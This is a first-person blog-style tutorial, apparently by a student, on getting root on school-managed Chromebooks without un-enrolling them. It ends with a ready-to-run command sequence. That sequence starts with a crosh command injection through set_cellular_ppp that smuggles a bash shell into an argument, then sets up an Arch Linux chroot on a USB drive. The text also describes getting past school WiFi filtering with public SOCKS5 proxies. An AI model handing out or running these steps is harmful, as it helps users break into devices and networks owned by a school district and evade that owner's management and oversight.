# Privelige escalation without un-enrolling

Following the recent discovery of the set_cellular_ppp crosh exploit and the (re)discovery of the various root escalation bugs found within ChromeOS (thanks, CoolElectronics), I saw that it was almost exclusively being used to un-enroll Chromebooks. Quite plainly, that's a terrible idea, and un-enrolling a district-managed Chromebook can result in serious consequences if you get caught.

So I took it upon myself to figure out how to run programs as root on a Chromebook without un-enrolling. Indeed, a daunting task. I set to work immediately, downloading a standalone executable for Firefox. After all, it would be somewhat amusing to run Firefox on a Chromebook, as the two browsers are fierce competitors. So, I downloaded the file with curl and...

```
-bash: ./portable-firefox.sh: /bin/sh: bad interpreter: Permission denied
```

Welp. Since Google is Google, they mounted the whole rootfs partition with noexec enabled, meaning that executables can't be, well, executed from the rootfs. But actually, that isn't quite true. ChromeOS uses a separate partition for the home directory, so, actually, the home directory was mounted as noexec. The rest of the rootfs could have executables run off of it, hence why I could run basic commands at all. And, on top of that, bash and dash are patched to refuse to execute scripts on the home partition. Of course. Thanks, Google.

But isn't there a way to remount these partitions? I do have root access. It turns out that ChromeOS also locks down remounting of the home partition unless you kill the main running processes, including the X server, which would traditionally drop the user to a tty output. But once again, oh-so-inconveniently, the second the processes were killed, the Chromebook restarted.

But what about USB drives? I rushed to grab a USB drive and plug it in, and lo and behold, it worked flawlessly. I was able to mount the drive and run executables from it with no issues whatsoever.

So how do we exploit this? Well, for one thing we can install a chroot (in this case, I chose to use Arch Linux) and use it to install and use packages. So I downloaded a rootfs tarball from one of the Arch Linux mirrors and extracted it in an empty folder on my USB drive (formatted with ext4, to support symlinks within the chroot). My initial attempts failed until I realized my mistake. I also had to mount the various special filesystems onto the chroot directory, then actually chroot into it. And...

```
root@archlinux ~$ 
```

Success! Now we have almost unlimited access to installing practically any software onto a USB drive and running it on a Chromebook! Let's update the pacman databases with `pacman -Sy` and...

```
downloading required keys...
error: key "A6234074498E9CEE" could not be looked up remotely
error: required key missing from keyring
error: failed to commit transaction (unexpected error)
Errors occurred, no packages were upgraded.
```

Ah, of course. School WiFi. It was blocking all requests to the required GPG keyservers, which was preventing my attempts to download the latest packages. But alas, there was no way to get around it... was what I thought for only about 30 seconds. I quickly found a list of socks5 proxies online and tested a couple until I found one that worked. It was working!

And of course, you're still reading this, so you clearly want to know how I did it and what commands I ran. Make sure you're on ChromeOS 81 before you run them. Here's a list of the steps, in order:

```bash
# In crosh
set_cellular_ppp \';bash;exit;\'
# In bash
cd ~
mkdir usbdrv
# TODO: Add root escalation script once it goes public
# Plug in your usb drive
fdisk -l
# Find your device in the list (usually /dev/sda, way at the bottom)
mount /dev/sdX /home/chronos/usbdrv # Your usb drive should replace /dev/sdX
cd /home/chronos/usbdrv
# Chroot setup
curl https://mirrors.mit.edu/archlinux/iso/2023.02.01/archlinux-bootstrap-2023.02.01-x86_64.tar.gz -o archlinux.tar.gz
tar -xvf archlinux.tar.gz
# You should be able to chroot in as normal now, but to perform package managment, you need to mount special filesystems such as /dev, /proc, and /tmp.
# To just chroot, run:
chroot ./root.x86_64
# Or, to mount the special filesystems and chroot
mount -t proc none /home/chronos/usbdrv/root.x86_64/proc
mount -o bind /dev /home/chronos/usbdrv/root.x86_64/dev
mount -o bind /sys /home/chronos/usbdrv/root.x86_64/sys
mount -o bind /run /home/chronos/usbdrv/root.x86_64/run
chroot ./root.x86_64
# If you want to have pacman functional, you need to uncomment a pacman mirror in /etc/pacman.d/mirrorlist
```
